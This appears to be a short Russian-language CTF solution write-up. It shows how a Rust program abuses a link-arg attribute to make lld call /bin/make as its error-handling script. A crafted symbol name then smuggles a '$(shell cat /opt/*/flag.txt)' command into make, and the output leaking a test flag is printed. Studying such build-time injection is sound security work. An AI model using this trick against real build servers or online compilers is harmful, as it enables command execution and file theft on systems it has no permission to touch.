# Решение
Понимаем, что ничего не получается без способа сделать ls, glob или чего-то еще более мощного. Не похоже, что макросы здесь помогут, поэтому ищем нечто лучше. Я посмотрел на asm! и подобное, затем начал смотреть в сторону других способов выбраться во внешнюю тулзу. Обнаружился link-arg, а в lld - --error-handling-script. Это невероятно, но все еще не решает задачу, ведь выбранный скрипт вызывается с аргументами вида `undefined-symbol <name>`. Но остается лишь порыться по стандартным инструментам linux и обнаружить, что make имеет полезные аргументы и может их принять после `undefined-symbol`. В итоге получается следующее решение:

```Rust
#![feature(link_arg_attribute)]

#[link(kind = "link-arg", name = "--error-handling-script=/bin/make")]
unsafe extern "C" {
    #[link_name = "--eval=undefined-symbol:$(shell cat /opt/*/flag.txt)"]
    fn nonexistent();
}

fn main() {
    unsafe {
        nonexistent();
    }
}
```
lld вызывает `make undefined-symbol --eval=undefined-symbol:$(shell cat /opt/*/flag.txt)`, что дает следующий вывод:
```
= note: make: *** No rule to make target 'flag{test_flag}', needed by 'undefined-symbol'.  Stop.
```